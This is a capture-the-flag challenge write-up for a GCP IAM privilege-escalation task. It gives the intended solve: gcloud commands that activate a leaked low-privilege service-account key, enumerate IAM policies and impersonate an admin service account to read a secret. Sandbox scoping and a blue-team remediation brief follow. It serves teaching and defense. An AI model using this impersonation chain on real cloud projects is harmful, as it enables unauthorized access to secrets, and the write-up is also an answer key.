# 11 — The Escalation (Ape Ride)

**Category:** IAM privilege escalation · **Difficulty:** Hard · **Points:** 300 (dynamic)

## Intended solve (2 steps)
```sh
gcloud auth activate-service-account --key-file=aperide-lowpriv-sa-key.json
gcloud config set project <sandbox>

# 1) Enumerate: which SA can I impersonate?
gcloud iam service-accounts list
gcloud iam service-accounts get-iam-policy aperide-admin@<sandbox>.iam.gserviceaccount.com
#    -> shows aperide-lowpriv as roles/iam.serviceAccountTokenCreator

# 2) Impersonate and read the secret
gcloud secrets versions access latest --secret=aperide-crown-jewels \
  --impersonate-service-account=aperide-admin@<sandbox>.iam.gserviceaccount.com   # CYPHER{...}
```

## Infra & safety
- `aperide-lowpriv` (leaked key): only `serviceAccountViewer` + Token Creator on
  the single `aperide-admin` SA. It cannot read the secret directly.
- `aperide-admin`: only `secretAccessor` on `aperide-crown-jewels`.
- Deliberately a **two-step chain** (per the softened Phase 1 brief), scoped so a
  leak reaches exactly one hop, never project admin.

## Remediation (Blue Team Brief)
Audit `serviceAccountTokenCreator` bindings (they are lateral-movement edges);
avoid long-lived keys; alert on impersonation; least-privilege every SA.
